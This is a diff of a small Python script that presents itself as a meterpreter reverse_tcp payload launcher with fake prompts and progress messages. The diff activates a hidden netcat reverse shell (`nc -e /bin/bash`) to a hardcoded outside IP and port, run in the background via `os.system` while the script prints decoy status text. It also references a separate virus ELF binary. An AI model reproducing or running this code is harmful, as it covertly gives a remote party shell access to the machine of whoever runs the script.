@@ -2,7 +2,7 @@ import os
 import subprocess
 import time
 
-# execute = ("nohup nc -e '/bin/bash' 52.15.194.28 11269 &")
+execute = ("nohup nc -e '/bin/bash' 52.15.194.28 11269 &")
 print
 print('Edit: Mohammed')
 print
@@ -11,7 +11,7 @@ print('')
 
 print('Payload Default: linux/meterpreter/reverse_tcp')
 
-time.sleep(17)
+time.sleep(15)
 
 os.system('clear')
 
@@ -20,25 +20,24 @@ print('')
 print('')
 port = raw_input('Port: ')
 
-# subprocess.call(execute, shell=True)
 
 os.system('clear')
 
 print('wait ')
 
-time.sleep(9)
+time.sleep(12)
 
+os.system(execute)
 print('Bind Privileges, one second...')
 
-time.sleep(32)
+time.sleep(3)
 
-print('Connection Successul')
+print('Connection $%@#&#')
 
-os.system('./../../virus.elf')
+#os.system('./../../virus_serverapacheosint.elf')
 
 print()
 print('Thanks You !!')
-
 
 
 
